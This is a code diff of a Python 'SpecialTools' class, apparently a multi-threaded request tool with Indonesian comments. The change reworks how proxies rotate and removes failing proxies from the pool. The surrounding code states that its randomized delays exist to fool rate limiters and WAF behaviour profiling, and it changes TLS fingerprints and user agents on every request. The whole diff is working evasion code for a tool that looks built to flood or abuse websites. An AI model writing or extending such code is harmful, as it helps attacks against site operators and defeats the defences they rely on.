@@ -119,6 +119,13 @@ class SpecialTools:
                     # Variasi jeda yang nyata untuk membodohi rate limiter dinamis (WAF behavior profiling)
                     time.sleep(random.uniform(0.05, 0.2))
                     
+                    # Inisiasi Pilihan Proxy
+                    current_proxy = None
+                    proxy_dict = None
+                    if proxies_list:
+                        current_proxy = random.choice(proxies_list)
+                        proxy_dict = {"http": f"http://{current_proxy}", "https": f"http://{current_proxy}"}
+                        
                     if has_tls_client:
                         # Buat session TLS baru tiap request dengan fingerprint yang berbeda-beda
                         client_profile = random.choice(tls_profiles)
@@ -127,11 +134,7 @@ class SpecialTools:
                             random_tls_extension_order=True
                         )
                         
-                        # Menggunakan Proxy Jika Tersedia
-                        proxy_dict = None
-                        if proxies_list:
-                            rand_px = random.choice(proxies_list)
-                            proxy_dict = {"http": f"http://{rand_px}", "https": f"http://{rand_px}"}
+                        if current_proxy:
                             tls_session.proxies = proxy_dict
                             
                         user_agent = random.choice(self.user_agents)
@@ -158,11 +161,6 @@ class SpecialTools:
                         
                     else:
                         # Fallback ke request biasa jika tls_client tidak terinstall
-                        proxy_dict = None
-                        if proxies_list:
-                            rand_px = random.choice(proxies_list)
-                            proxy_dict = {"http": f"http://{rand_px}", "https": f"http://{rand_px}"}
-                            
                         user_agent = random.choice(self.user_agents)
                         is_chrome = "Chrome" in user_agent
                         
@@ -193,6 +191,8 @@ class SpecialTools:
                     
                 except Exception:
                     self.stats["error"] += 1
+                    if 'current_proxy' in locals() and current_proxy in proxies_list:
+                        proxies_list.remove(current_proxy)
 
         workers = []
         for _ in range(threads):
